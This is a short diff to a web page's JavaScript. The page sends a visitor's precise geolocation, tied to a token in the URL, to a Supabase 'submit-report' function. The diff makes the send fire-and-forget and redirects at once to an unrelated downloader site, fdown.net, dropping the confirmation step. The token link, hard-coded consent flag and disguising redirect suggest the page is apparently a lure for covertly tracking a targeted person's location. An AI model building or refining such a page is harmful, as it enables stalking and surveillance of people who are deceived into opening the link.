@@ -108,37 +108,29 @@
       status("Sending your location…");
 
       try {
-        const response = await fetch(
-          SUPABASE_URL + "/functions/v1/submit-report",
-          {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-              "apikey": SUPABASE_PUBLISHABLE_KEY
-            },
-            body: JSON.stringify({
-              token,
-              consent: true,
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude,
-              accuracy: position.coords.accuracy
-            })
-          }
-        );
+        // Start the consented location submission as a keepalive request,
+        // then redirect immediately without waiting for the response.
+        const payload = JSON.stringify({
+          token,
+          consent: true,
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy
+        });
 
-        const result = await response.json().catch(() => ({}));
+        fetch(SUPABASE_URL + "/functions/v1/submit-report", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "apikey": SUPABASE_PUBLISHABLE_KEY
+          },
+          body: payload,
+          keepalive: true
+        }).catch(() => {});
 
-        if (!response.ok || result.success !== true) {
-          throw new Error(result.error || "Location could not be sent.");
-        }
-
-        status("Location shared successfully.");
-
-        // Redirect only after the server confirms successful submission.
         const cleanUrl = new URL(location.href);
         cleanUrl.searchParams.delete("token");
         history.replaceState({}, "", cleanUrl);
-
         window.location.replace("https://fdown.net/");
       } catch (error) {
         status(error.message || "Unable to send location. Please try again.");
